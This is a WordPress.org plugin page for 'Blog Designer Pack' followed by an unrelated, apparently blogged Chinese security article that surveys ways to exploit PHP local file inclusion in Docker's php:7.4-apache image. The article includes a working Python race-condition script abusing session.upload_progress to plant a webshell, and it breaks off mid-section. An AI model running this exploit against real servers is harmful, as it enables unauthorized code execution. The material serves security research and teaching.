#### What’s Next

If you find News & Blog Designer Pack – WordPress Blog Plugin plugin useful, please leave a good rating and consider checking out our other plugins:

* [Post Slider and Carousel with Widget](https://premium.infornweb.com/post-slider-and-carousel-pro/ "Post Slider and Carousel with Widget - A Responsive Post Slider") – A Responsive Post Slider and Post Carousel Plugin
* [Logo Showcase with Slick Slider](https://premium.infornweb.com/logo-showcase-with-slick-slider-pro/ "Logo Showcase with Slick Slider – Logo Carousel, Logo Slider & Logo Grid") – Logo Carousel, Logo Slider & Logo Grid Plugin
* [Posts List Designer by Category](https://premium.infornweb.com/post-list-designer-pro/ "Posts List Designer by Category - List Category Posts Or Recent Posts") – Display Posts by Category in a List View

## Screenshots

* [![](https://ps.w.org/blog-designer-pack/assets/screenshot-1.png?rev=1853879)](https://ps.w.org/blog-designer-pack/assets/screenshot-1.png?rev=1853879)

  Blog Designer Pack – Grid Layout
* [![](https://ps.w.org/blog-designer-pack/assets/screenshot-2.png?rev=1853879)](https://ps.w.org/blog-designer-pack/assets/screenshot-2.png?rev=1853879)

  Blog Designer Pack – List Layout
* [![](https://ps.w.org/blog-designer-pack/assets/screenshot-3.png?rev=1853879)](https://ps.w.org/blog-designer-pack/assets/screenshot-3.png?rev=1853879)

  Blog Designer Pack – Masonry Layout
* [![](https://ps.w.org/blog-designer-pack/assets/screenshot-4.png?rev=1853879)](https://ps.w.org/blog-designer-pack/assets/screenshot-4.png?rev=1853879)

  Blog Designer Pack – Slider Layout
* [![](https://ps.w.org/blog-designer-pack/assets/screenshot-5.png?rev=1853879)](https://ps.w.org/blog-designer-pack/assets/screenshot-5.png?rev=1853879)

  Blog Designer Pack – Carousel Layout
* [![](https://ps.w.org/blog-designer-pack/assets/screenshot-6.png?rev=1853879)](https://ps.w.org/blog-designer-pack/assets/screenshot-6.png?rev=1853879)

  Blog Designer Pack – Grid Box Layout

## Installation

1. Upload the ‘blog-designer-pack’ folder to the ‘/wp-content/plugins/’ directory.
2. Activate the Blog Designer Pack plugin through the ‘Plugins’ menu in WordPress.
3. Add and manage blog post items on your site by clicking on the ‘Post’ tab that appears in your admin menu.

## FAQ

### How to Use Post Grid, Post Slider, Post Carousel, Partial Slide, Post Timeline, Post Grid box and Post Grid box Slider etc.

Go to Blog Designer Pack > Shortcode Generator and select the layout from right side and parameter from left side.

Note – Some layouts and parameters are available in the pro version only.

### Why My Post Page, Blog Page is not changed OR Blog Page, Post Page design is same like theme design?

Blog page content is handled by WordPress it self.

To enable Blog Designer Pack plugin design on post page or blog page, you need to make sure that blog page or post page should not be selected on posts page of reading settings. ( Settings > Reading)

We recommend that please read the below sections for more details.

**Blog page is already created**

If “Blog” page is already created and assigned that page as a posts page under WordPress Settings > Reading then please change that selection to default one ( ” — Select — ” ) from the drop down. Once you de-select this setting, open your “Blog” page in edit mode and add the plugin shortcode (Shortcodes are shown under Getting Started section of plugin menu)

**Blog page is not created**

If blog page is not created then go to Pages > Add New and create a blog page OR some other name as per your need and add the shortcode.

### Where can I find complete shortcode parameters?

Each shortcode parameters can be found on this page at plugin “Details” tab.

### Where can I ask for help or talk for plugin issues?

If you need any help, you can ask it at Blog Designer Pack plugin [Support Forum](https://wordpress.org/support/plugin/blog-designer-pack/) page.

### Can I create post slider or post carousel with the help of Blog Designer Pack plugin?

Yes, plugin have Slider and Carousel layout shortcode available with two built-in designs.

### Can I create post ticker or blog ticker with the help of Blog Designer Pack plugin?

Yes, plugin option where you can create post ticker or blog ticker.

### Does Blog Designer Pack plugin have pagination?

Yes, Blog Designer Pack plugin have pagination feature. There are still four types of different pagination like “Load More”, “Infinite Scroll” and etc available in Pro version.

### What about custom post type support?

Custom Post type support only available with Blog Designer Pack PRO version.

### Can I create post grid, post slider or post list?

Yes, Blog Designer Pack plugin can help you to create following layouts – post filter by Categories, post grid, post slider and post slider with thumbnails, post carousel layout & partial slide, post list, post simple list and archive list, post timeline, post grid box and grid box slider, post and categories ticker, post masonry, featured and trending Post etc.

### Can I create category grid or category slider with the help of Blog Designer Pack plugin?

Category grid or slider only available with Blog Designer Pack PRO version.

### Is it working with older version of WordPress?

Yes, It is a post grid and blog grid plugin it works great with WordPress version 5.x.x or more and WordPress latest version.

### Will Blog Designer Pack plugin work with my theme?

Yes, Blog Designer Pack will work with any WordPress themes, but may require some styling changes to make it compatible with your theme. If you are facing any compatibility issue with Blog Designer Pack plugin then please contact us at [Support Forum](https://wordpress.org/support/plugin/blog-designer-pack/) page.

## Reviews

![](https://secure.gravatar.com/avatar/bee004749c3db1f902625c6c7765d2ba912e17acaaf0638b5056ef9024eb89d9?s=60&d=retro&r=g)
### [Awesome Plugin and Great Support](https://wordpress.org/support/topic/awesome-plugin-and-great-support-74/)

[All Spiced Out](https://profiles.wordpress.org/allspicedout/ "Posts by All Spiced Out")
January 9, 2025

This plugin is very easy to use and allows for customization through simple CSS styling to fit your unique WP theme. It has a many different configurations that can accommodate most needs, even in the free version. Highly recommended and versatile plugin for anyone looking to display posts with a professional layout on their website.

![](https://secure.gravatar.com/avatar/ba10d234e2bd5a8be3d9012e4dd93fad3d4cc52cae49d896b7ad4d613bb568cb?s=60&d=retro&r=g)
### [Excellent support](https://wordpress.org/support/topic/excellent-support-2397/)

[ryap](https://profiles.wordpress.org/ryap/ "Posts by ryap")
December 17, 2024

Fast response, clear communications, very happy w support received!

![](https://secure.gravatar.com/avatar/3defecf308c73d5804cc26ccc5efb67458657beda6fbcb9fa204d66ee75d7125?s=60&d=retro&r=g)
### [Great plugin and support](https://wordpress.org/support/topic/great-plugin-and-support-1789/)

[rlantill](https://profiles.wordpress.org/rlantill/ "Posts by rlantill")
November 25, 2024

I have found this plugin to be the best one to suit my needs (I did try several). I did need some help tweaking it to suit my needs, and Harpreet was very helpful with this. He found an issue on my site and was able to give me precise details to give to my web guy. Very happy customer. Thank you.

![](https://secure.gravatar.com/avatar/313f4c4fd7232dff4555e2a8be57e010d1fdee1f3fb1a3dd70a5cc0944934392?s=60&d=retro&r=g)
### [excellent support](https://wordpress.org/support/topic/excellent-support-2314/)

[frawawp](https://profiles.wordpress.org/frawawp/ "Posts by frawawp")
August 26, 2024

excellent support, also for free version

![](https://secure.gravatar.com/avatar/5b7088c8625e2aa2bb0ccf18e0a9954de1e0d026ccfb8dddb6b29614b7fc8bbf?s=60&d=retro&r=g)
### [Prompt Support](https://wordpress.org/support/topic/prompt-support-32/)

[vmmodak](https://profiles.wordpress.org/vmmodak/ "Posts by vmmodak")
June 28, 2024

Prompt ,efficient and Productive support. We had a couple of issues, which got resolved quickly.

![](https://secure.gravatar.com/avatar/365a059504905375106b80a312131dce9fc4b867617ebfe95bb1a26326c4a7be?s=60&d=retro&r=g)
### [Surprisingly fast responses from support emails](https://wordpress.org/support/topic/surprisingly-fast-responses-from-support-emails/)

[jmdevhelp](https://profiles.wordpress.org/jmdevhelp/ "Posts by jmdevhelp")
June 18, 2024

Super helpful, detailed answers when emailing their support team. Widgets work great!

[Read all 68 reviews](https://wordpress.org/support/plugin/blog-designer-pack/reviews/)
## Contributors & Developers

“Blog Grid & Post Grid – Blog Post Slider, Blog Post Carousel, Blog Post Ticker, Blog Post Masonry, Category Post Grid By News & Blog Designer Pack” is open source software. The following people have contributed to this plugin.

Contributors

* ![](https://secure.gravatar.com/avatar/d480f2d6592a141b2cfa6752ac55e77dcd541c3653323a26182c6236b8c5b313?s=32&d=mm&r=g) [InfornWeb](https://profiles.wordpress.org/infornweb/)
* ![](https://secure.gravatar.com/avatar/e36be27a03ad6595730e8c5139f689ed96c6df6ccacf88b19b7c1a1c000f8d1d?s=32&d=mm&r=g) [pluginandplay](https://profiles.wordpress.org/pluginandplay/)

“Blog Grid & Post Grid – Blog Post Slider, Blog Post Carousel, Blog Post Ticker, Blog Post Masonry, Category Post Grid By News & Blog Designer Pack” has been translated into 1 locale. Thank you to [the translators](https://translate.wordpress.org/projects/wp-plugins/blog-designer-pack/contributors) for their contributions.

[Translate “Blog Grid & Post Grid – Blog Post Slider, Blog Post Carousel, Blog Post Ticker, Blog Post Masonry, Category Post Grid By News & Blog Designer Pack” into your language.](https://translate.wordpress.org/projects/wp-plugins/blog-designer-pack)

### Interested in development?

[Browse the code](https://plugins.trac.wordpress.org/browser/blog-designer-pack/), check out the [SVN repository](https://plugins.svn.wordpress.org/blog-designer-pack/), or subscribe to the [development log](https://plugins.trac.wordpress.org/log/blog-designer-pack/) by [RSS](https://plugins.trac.wordpress.org/log/blog-designer-pack/?limit=100&mode=stop_on_copy&format=rss).

## Changelog

#### 3.4.10 (30 Nov, 2024)

* [\*] Fixed translation loading notice in WordPress 6.7

#### 3.4.9 (20 Nov, 2024)

* [\*] Check compatibility with WordPress 6.7
* [\*] Update Freemius SDK to latest version 2.9.0

#### 3.4.8 (08 Sep, 2024)

* [\*] Check compatibility with WordPress 6.6.1
* [\*] Update Freemius SDK to latest version 2.7.4

#### 3.4.7 (23 July, 2024)

* [\*] Update Freemius SDK to latest version 2.7.3

#### 3.4.6 (06 July, 2024)

* [\*] Fixed one PHP warning with PHP version 8.1
* [\*] Check compatibility with WordPress 6.6

#### 3.4.5 (05 May, 2024)

* [\*] Added ‘Post Content Fix’ functionality to get post content between the shortcode when post is built with page builders or shortcodes.
* [\*] Improved plugin text domain code.
* [\*] Bump minimum WordPress version to 4.7
* [\*] Check compatibility with WordPress 6.5.2
* [\*] Update Freemius SDK to latest version 2.7.2

#### 3.4.4 (17 March, 2024)

* [\*] Check compatibility with WordPress 6.5
* [\*] Update Freemius SDK to latest version 2.6.2

#### 3.4.3 (15 Nov, 2023)

* [\*] Check compatibility with WordPress 6.4.1
* [\*] Update Freemius SDK to latest version 2.6

#### 3.4.2 (26 Oct, 2023)

* [\*] Update Load More functionality with better security.

#### 3.4.1 (17 July, 2023)

* [\*] Update Freemius SDK to latest version 2.5.10

#### 3.4 (21 May, 2023)

* [\*] Check compatibility with WordPress 6.2.2
* [\*] Update Freemius SDK to latest version 2.5.8

#### 3.3 (05 Jan, 2023)

* [\*] Update – Use escaping functions for better security.
* [\*] Check compatibility with WordPress 6.1.1

#### 3.2 (17 Nov, 2022)

* [+] Added Divi Theme support to display post short content if post is designed with DIVI page builder.
* [\*] Fixed ‘Show Date’ and ‘Show Category’ option remain selected in widgets.
* [\*] Updated Freemius SDK to latest version 2.5.2
* [\*] Check compatibility with WordPress 6.1

#### 3.1 (13 Aug, 2022)

* [\*] Fix ‘content\_words\_limit’ shortcode parameter is not working for post excerpt.
* [\*] Fix some undefined variable warning within Widget.
* [\*] Fix shortcode builder default parameter issue.

#### 3.0 (05 Aug, 2022)

* [\*] Updated Freemius SDK to latest version 2.4.5
* [\*] Taken care of data sanitization & data escaping for better security.

#### 2.3.2 (29 May, 2022)

* [\*] Check compatibility with WordPress 6.0

#### 2.3.1 (26 Feb, 2022)

* [\*] Check compatibility with WordPress 5.9.1
* [\*] Update Freemius SDK to latest version 2.4.3

#### 2.3 (30 Jan, 2022)

* [\*] Fixed plugin JS initialize issue within WP Bakery page builder.
* [\*] Check compatibility with WordPress 5.9

#### 2.2.9 (26 Dec, 2021)

* [\*] Removed one unnecessary function.

#### 2.2.8 (22 Nov, 2021)

* [\*] Tested with WP 5.8.2
* [\*] Fixed Masonry layout load more issue when category slug used.
* [\*] Updated Freemius SDK to latest version.

#### 2.2.7 (07 April, 2021)

* [\*] Code optimization.
* [\*] Removed some unused functions.

#### 2.2.6 (25 March, 2021)

* [\*] Replaced some jQuery deprecated syntax with jQuery 3.0+ syntax.
* [\*] Tested up to WordPress 5.7
* [-] Removed one admin notice.

#### 2.2.5 (14 Dec, 2020)

* [\*] Updated Freemius SDK to latest version.
* [\*] Tested up to WordPress 5.6
* [+] Added blog-designer-pack-es\_MX.po file

#### 2.2.4 (15 Sep, 2020)

* [\*] Fixed one JavaScript issue.

#### 2.2.3 (08 Sep, 2020)

* [+] Added category Slug support for shortcode parameter “category”. Now you can use this parameter with category id as well as category slug. e.g. category=”5″ OR category=”technology” where 5 is category id and technology is category slug.
* [+] Added a new class for meta separator in all designs files as requested by many users.
* [\*] Updated public JS file to avoid JS error conflict with any other 3rd party plugin/theme.
* [\*] Fixed Shortcode Builder – Masonry load more pagination issue.

#### 2.2.2 (19 Aug, 2020)

* [\*] Check compatibility with WordPress 5.5

#### 2.2.1 (23 July, 2020)

* [\*] Fixed fatal error when activating the Premium version or vice versa.

#### 2.2 (23 July, 2020)

* [+] Added Shortcode Builder – Now create shortcode easily.
* [\*] Improved get in started page.
* [\*] Fixed some design related issues.
* [\*] Fixed Vertical Scrolling JS issue.

#### 2.1 (06 June, 2020)

* [+] Added Elementor shortcode widget support.
* [+] Added Visual Composer page builder raw HTML and text block support.
* [\*] Fixed pagination issue if shortcode added in single post.
* [\*] Fixed slider shortcode design issue where no image is added as a background image.
* [\*] Vertical Scrolling JS update for better output.
* [-] Removed some unwanted CSS.

#### 2.0 (21 March, 2020)

* [\*] Added ‘Getting Started’ page for better user experience.

#### 1.1 (14 Jan, 2020)

* [\*] Added Freemius SDK for freemium version.

#### 1.0.9 (07 Nov, 2019)

* [\*] Check plugin compatibility with WordPress 5.3

#### 1.0.8 (21 Aug, 2019)

* [\*] Resolved some string translation issue.
* [\*] Fixed some designing issues.

#### 1.0.7 (18 Aug, 2019)

* [+] Added language .pot file for translation.
* [\*] Appropriate formatting of template files.
* [\*] Used post title as a image alt tag for better SEO purpose.
* [\*] Used escaping function in template files.
* [\*] Prevent template file to open directly via URL.

#### 1.0.6 (14 July, 2019)

* [\*] Fix some wrong text domain for translation.
* [\*] Changed wp\_reset\_query() to wp\_reset\_postdata().
* [\*] Fixed some other small issues and checked all shortcodes parameters.

#### 1.0.5

* [+] Updated plugin translation code. Now user can put plugin languages file in WordPress “language” folder so plugin language file will not be loss while plugin update.

#### 1.0.4

* [\*] Follow WordPress plugin guidelines.

#### 1.0.3

* [\*] Fixed some small-small design related issue.
* [\*] Added Pro version if you need more designs and option.

#### 1.0.2

* [\*] Fixed some CSS issues

#### 1.0.1

* [\*] Resolved Fatal error when post featured image is not set..

#### 1.0

* Initial release.

## Meta

* Version **3.4.10**
* Last updated **1 month ago**
* Active installations **30,000+**
* WordPress version **4.7 or higher**
* Tested up to **6.7.1**
* PHP version **5.4 or higher**
* Languages
  See all 2

  Close

  [English (US)](https://wordpress.org/plugins/blog-designer-pack/) and [Russian](https://ru.wordpress.org/plugins/blog-designer-pack/).

  [Translate into your language](https://translate.wordpress.org/projects/wp-plugins/blog-designer-pack)
* Tags [blog](https://wordpress.org/plugins/tags/blog/)[news](https://wordpress.org/plugins/tags/news/)[post carousel](https://wordpress.org/plugins/tags/post-carousel/)[post grid](https://wordpress.org/plugins/tags/post-grid/)[post slider](https://wordpress.org/plugins/tags/post-slider/)
* [Advanced View](https://wordpress.org/plugins/blog-designer-pack/advanced/)

## Ratings

4.7 out of 5 stars.

* [61 5-star reviews
  5 stars

  61](https://wordpress.org/support/plugin/blog-designer-pack/reviews/?filter=5)
* [2 4-star reviews
  4 stars

  2](https://wordpress.org/support/plugin/blog-designer-pack/reviews/?filter=4)
* [0 3-star reviews
  3 stars

  0](https://wordpress.org/support/plugin/blog-designer-pack/reviews/?filter=3)
* [2 2-star reviews
  2 stars

  2](https://wordpress.org/support/plugin/blog-designer-pack/reviews/?filter=2)
* [3 1-star reviews
  1 star

  3](https://wordpress.org/support/plugin/blog-designer-pack/reviews/?filter=1)

[Add my review](https://wordpress.org/support/plugin/blog-designer-pack/reviews/#new-post)

[See all reviews](https://wordpress.org/support/plugin/blog-designer-pack/reviews/)

## Contributors

* ![](https://secure.gravatar.com/avatar/d480f2d6592a141b2cfa6752ac55e77dcd541c3653323a26182c6236b8c5b313?s=32&d=mm&r=g) [InfornWeb](https://profiles.wordpress.org/infornweb/)
* ![](https://secure.gravatar.com/avatar/e36be27a03ad6595730e8c5139f689ed96c6df6ccacf88b19b7c1a1c000f8d1d?s=32&d=mm&r=g) [pluginandplay](https://profiles.wordpress.org/pluginandplay/)
## Support

Issues resolved in last two months:

2 out of 2

[View support forum](https://wordpress.org/support/plugin/blog-designer-pack/)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from www.leavesongs.com_9b2a3dc1_20250111_063909.html ===


* [主页](/)
* 返回

Back to top
Share post

# Docker PHP裸文件本地包含综述

phithon

Nov 01, 2021, 5:49 PM

阅读：85731

[网络安全](/sort/PENETRATION)

[Docker](/tag/Docker),
[PHP安全](/tag/PHP%E5%AE%89%E5%85%A8)

> 本文首发在[跳跳糖社区](https://tttang.com/archive/1312/)。

2018年『代码审计』星球举办的[Code-Breaking Puzzles](https://code-breaking.com/)非常成功，后面我就一直想再做一次类似的活动。Code-Breaking属于极其偏向于trick分享的代码审计谜题，所以要求题目具有一定的独创性，最好是能用10行以内的代码片段，描述一个具有实战价值的场景。

大概在去年疫情在家办公那段时间，有个同学问过我一个问题，他遇到了一个PHP文件包含漏洞，但找不到利用方法，目标是跑在Docker里，也没找到太多可以利用的文件。我当时觉得这是老生常谈的问题了，就跟他讲了几个我已知的方法，但后来我自己下去研究的时候又发现了一种新方法，个人感觉还挺适合放到Code-Breaking里作为题目的，就暂放到题库里了。

没想到Code-Breaking一直难产到了2021年，直到十一期间我在研究Caddy相关的安全问题时，无意间看到一篇RCTF 2021的Writeup，才发现这个trick被用掉了（最早出现在2020年巅峰极客比赛中）。有点心痛，于是把所有方法整理一下发表了这篇文章，也算没把研究成果浪费掉。

这篇文章研究的题目是：**在使用Docker官方的PHP镜像`php:7.4-apache`时，Web应用存在文件包含漏洞，在没有文件上传的情况下如何利用？**

我们可以使用docker启动一个服务器进行测试，命令是`docker run -d --name web -p 8080:80 -v $(pwd):/var/www/html php:7.4-apache`，文件包含的代码如下：

```
<?php
include $_REQUEST['file'];

```
## [0x01 日志文件包含为什么不行？](#0x01)

这个问题经常在实战中遇到了，特别是黑盒的情况下，功能点也少，找不到可以被包含的文件。通常此时我们会去尝试包含一些系统日志、Web日志等系统文件。

但是，如果目标在Docker环境中会具有如下特点：

* 容器只会运行Apache，所以没有第三方软件日志
* Web日志重定向到了`/dev/stdout`、`/dev/stderr`

我们可以查看[PHP的Dockerfile](https://github.com/docker-library/php/blob/41d3146/7.4/buster/apache/Dockerfile#L85)，会发现有几个日志文件都被使用标准输出、标准错误的软链接替代了：

```
# logs should go to stdout / stderr
    ln -sfT /dev/stderr "$APACHE_LOG_DIR/error.log"; \
    ln -sfT /dev/stdout "$APACHE_LOG_DIR/access.log"; \
    ln -sfT /dev/stdout "$APACHE_LOG_DIR/other_vhosts_access.log"; \
    # ...

```

此时包含这些Web日志会出现`include(/dev/pts/0): failed to open stream: Permission denied`的错误，因为PHP没有权限包含设备文件：

[![image.png](/media/attachment/2021/11/01/e8198610-1181-4f2b-8e49-c7348a9a9bef.7a577b438fb6.png)](/media/attachment/2021/11/01/e8198610-1181-4f2b-8e49-c7348a9a9bef.png)

所以，利用日志包含来getshell的方法就无法进行了。

远程包含因为默认不开启，所以我们也不作为一个候选项，想要getshell还是需要找到一个可以控制内容的文件进行包含。

## [0x02 phpinfo与条件竞争](#0x02-phpinfo)

第二个想到的方法自然就是经典的临时文件包含，这个方法出自于Insomniasec的安全研究员Brett Moore在2011年的一篇Paper《[LFI WITH PHPINFO() ASSISTANCE](https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf)》。

我们对任意一个PHP文件发送一个上传的数据包时，不管这个PHP服务后端是否有处理`$_FILES`的逻辑，PHP都会将用户上传的数据先保存到一个临时文件中，这个文件一般位于系统临时目录，文件名是php开头，后面跟6个随机字符；在整个PHP文件执行完毕后，这些上传的临时文件就会被清理掉。

所以，临时文件的生命周期大概是这样（图来自[Gynvael Coldwind](https://gynvael.coldwind.pl/?id=50)）：

[![image.png](/media/attachment/2021/11/01/16dc9c76-3d84-4dcf-9e36-669f4c743991.8f5605888493.png)](/media/attachment/2021/11/01/16dc9c76-3d84-4dcf-9e36-669f4c743991.png)

在从“PHP writes data to temp file”到“php removes temp files(if any)”这两个操作之间的这段时间，我们可以包含这个临时文件，最后完成getshell操作。但这里面暗藏了一个大坑就是，**临时文件的文件名我们是不知道的**。

所以这个利用的条件就是，需要有一个地方能获取到文件名，例如phpinfo。phpinfo页面中会输出这次请求的所有信息，包括`$_FILES`变量的值，其中包含完整文件名：

[![image.png](/media/attachment/2021/11/01/97369ebf-0c5b-4fcd-94ca-382e92f06685.6faa5fd57e52.png)](/media/attachment/2021/11/01/97369ebf-0c5b-4fcd-94ca-382e92f06685.png)

但第二个难点就是，即使我们能够在目标网站上找到一个phpinfo页面并读取到临时文件名，这个文件名也是这一次请求里的临时文件，在这次请求结束后这个临时文件就会被删掉，并不能在后面的文件包含请求中使用。

所以此时需要利用到条件竞争（Race Condition），原理也好理解——我们用两个以上的线程来利用，其中一个发送上传包给phpinfo页面，并读取返回结果，找到临时文件名；第二个线程拿到这个文件名后马上进行包含利用。

这是一个很理想的状态，现实情况下我们需要借助下面这些方法来提高成功率：

* 使用大量线程来进行第二个操作，来让包含操作尽可能早于临时文件被删除
* 如果目标环境开启了`output_buffering`这个配置（在某些环境下是默认的），那么phpinfo的页面将会以流式，即chunked编码的方式返回。这样，我们可以不必等到phpinfo完全显示完成时就能够读取到临时文件名，这样成功率会更高
* 我们可以在请求头、query string里插入大量垃圾字符来使phpinfo页面更大，返回的时间更久，这样临时文件保存的时间更长。但这个方法在不开启`output_buffering`时是没有影响的。

经过测试我发现，不管目标环境是否开启`output_buffering`，都可以利用成功，可能只是成功率有所差别：

[![image.png](/media/attachment/2021/11/01/ee3e922f-96c4-4f15-99d8-2101dacd6fe1.88211f4b6d66.png)](/media/attachment/2021/11/01/ee3e922f-96c4-4f15-99d8-2101dacd6fe1.png)

这里面的[exp.py](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py)即为原作者给出的利用脚本。我在Docker PHP 7.4下用150线程进行了大概20次尝试，最终成功，成功后会写入一个新的文件`/tmp/g`，这个文件就不会被删除了。

这个利用方法有一处真实案例可以参考：《[自如网某业务文件包含导致命令执行（LFI + PHPINFO getshell 实例）](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0151653)》。

## [0x03 Windows 通配符妙用](#0x03-windows)

0x02中的利用方法需要两个条件：

1. 存在phpinfo等可以泄露临时文件名的页面
2. 网络条件好，才能让Race Condition成功

特别是第一个，现在很少有机会让我们在实战中找到phpinfo页面。但是如果目标操作系统是Windows，我们可以借助一些特殊的Tricks来实现文件包含的利用。

PHP在读取Windows文件时，会使用到[FindFirstFileExW](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfileexw)这个Win32 API来查找文件，而这个API是支持使用通配符的：

> **lpFileName**
>
> The directory or path, and the file name. The file name can include wildcard characters, for example, an asterisk (\*) or a question mark (?).

实际测试下来，PHP中星号和问号并不能直接作为通配符使用。

但我们在[MSDN官方文档](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-_fsrtl_advanced_fcb_header-fsrtlisnameinexpression)中还可以看到这样的说明：

> The following wildcard characters can be used in the pattern string.
>
> Wildcard character Meaning
>
> **\*** (asterisk) Matches zero or more characters.
>
> **?** (question mark) Matches a single character.
>
> **DOS\_DOT** Matches either a period or zero characters beyond the name string.
>
> **DOS\_QM** Matches any single character or, upon encountering a period or end of name string, advances the expression to the end of the set of contiguous DOS\_QMs.
>
> **DOS\_STAR** Matches zero or more characters until encountering and matching the final . in the name.

其中除了星号和问号外，还提到了三个特殊符号DOS\_DOT、DOS\_QM、DOS\_STAR，虽然官方并没有在文档中给出他们对应的值具体是什么，但在ntifs.h头文件中还是能找到他们的定义：

```
//  The following constants provide addition meta characters to fully
//  support the more obscure aspects of DOS wild card processing.

#define DOS_STAR        (L'<')
#define DOS_QM          (L'>')
#define DOS_DOT         (L'"')

```

也就是说：

* DOS\_STAR：即 `<`，匹配0个以上的字符
* DOS\_QM：即`>`，匹配1个字符
* DOS\_DOT：即`"`，匹配点号

这样，我们在Windows下，可以使用上述通配符来替代临时文件名中的随机字符串：`C:\Windows\Temp\php<<`。（由于Windows内部的一些不太明确的原因，这里一般需要用两个`<`来匹配多个字符）

我们直接向含有文件包含漏洞的页面发送一个上传包：

[![image.png](/media/attachment/2021/11/01/c6d69d9f-7ce0-4a16-b10f-15ef6baa1720.0e7146375019.png)](/media/attachment/2021/11/01/c6d69d9f-7ce0-4a16-b10f-15ef6baa1720.png)

根据前文给出的临时文件生命周期，我们上传的文件会在执行文件包含前被写入临时文件中；文件包含时我们借助Windows的通配符特性，在临时文件名未知的情况下成功包含，执行任意代码。

说句题外话，这种上传文件的同时利用临时文件的操作，我在另一篇文章《[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)》中也利用过，但是有的新人朋友还是很难理解这个过程：

[![image.png](/media/attachment/2021/11/01/77f02128-e595-457e-8c6f-f8fa783eac4d.c09fdd68253b.png)](/media/attachment/2021/11/01/77f02128-e595-457e-8c6f-f8fa783eac4d.png)

这确实是一个比较需要从程序员思维转换到黑客思维的过程，很多人最难理解的地方为什么明明看似是两个操作（文件上传+文件包含），却在一个请求中执行了，如果有这个疑问，那么还是需要再继续理解理解整个流程。

## [0x04 `session.upload_progress`与Session文件包含](#0x04-sessionupload_progresssession)

上述的两个方法，其实都没有解决本篇文章遇到的问题，毕竟Docker环境即不存在phpinfo也不存在Windows特性。

第三个方法也已经广为流传，PHP中可以通过session progress功能实现临时文件的写入。这种利用方式需要满足下面几个条件：

* 目标环境开启了`session.upload_progress.enable`选项
* 发送一个文件上传请求，其中包含一个文件表单和一个名字是`PHP_SESSION_UPLOAD_PROGRESS`的字段
* 请求的Cookie中包含Session ID

这个方法的原理是，PHP在开启了`session.upload_progress.enable`后（在包括Docker的大部分环境下默认是开启的），将会把用户上传文件的信息保存在Session中，而PHP的Session默认是保存在文件里的。

所以当攻击者发送满足上述条件的数据包时，就等于能够控制Session文件内容。

我们可以尝试发送满足上述条件的数据包来测试一下，但会发现虽然我们可以让PHP开启Session，从而在/tmp目录下遗留下Session文件，但这个文件内容是空的。

原因是，PHP中还有另外一个配置项`session.upload_progress.cleanup`，默认开启。在这个选项开启时，PHP会在上传请求被读取完成后自动清理掉这个Session，如果我们尝试把这个选项关闭，就可以读取到Session文件的内容了：

[![image.png](/media/attachment/2021/11/01/f328427d-cb91-4e7c-924c-0dacb8e34e8d.dd2cfc9ada9e.png)](/media/attachment/2021/11/01/f328427d-cb91-4e7c-924c-0dacb8e34e8d.png)

> 注意的是，如果我们只上传一个文件，这里也是不会遗留下Session文件的，所以表单里必须有两个以上的文件上传。

所以，默认情况下，我们需要在Session文件被清理前利用它，这也会用到条件竞争（Race Condition）。

因为这里的Session文件名是可控的，所以相比于0x02的条件竞争，这个会简单很多。我写了一个小脚本来利用，几乎没有失败过：

```
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, wait

target = 'http://192.168.1.162:8080/index.php'
session = requests.session()
flag = 'helloworld'

def upload(e: threading.Event):
    files = [
        ('file', ('load.png', b'a' * 40960, 'image/png')),
    ]
    data = {'PHP_SESSION_UPLOAD_PROGRESS': rf'''<?php file_put_contents('/tmp/success', '<?=phpinfo()?>'); echo('{flag}'); ?>'''}

    while not e.is_set():
        requests.post(
            target,
            data=data,
            files=files,
            cookies={'PHPSESSID': flag},
        )

def write(e: threading.Event):
    while not e.is_set():
        response = requests.get(
            f'{target}?file=/tmp/sess_{flag}',
        )

        if flag.encode() in response.content:
            e.set()

if __name__ == '__main__':
    futures = []
    event = threading.Event()
    pool = ThreadPoolExecutor(15)
    for i in range(10):
        futures.append(pool.submit(upload, event))

    for i in range(5):
        futures.append(pool.submit(write, event))

    wait(futures)

```

脚本执行完毕后会在目标中写入`/tmp/success`文件，里面即为Webshell：

[![image.png](/media/attachment/2021/11/01/1d135d76-2103-4e78-b097-5c728bd72166.cc27abfb7aa5.png)](/media/attachment/2021/11/01/1d135d76-2103-4e78-b097-5c728bd72166.png)

## [0x05 Segfault遗留下TEMP文件](#0x05-segfaulttemp)

那么，如果关闭了`session.upload_progress.enable`，是否还有其他利用方法呢？

我们的目的是在服务器上留下一个内容可控的文件，最简单的方法就是利用上传包的临时文件。但这个临时文件之所以不能直接利用，原因有两点：

* 临时文件名是随机的
* 临时文件在请求结束后会被删除

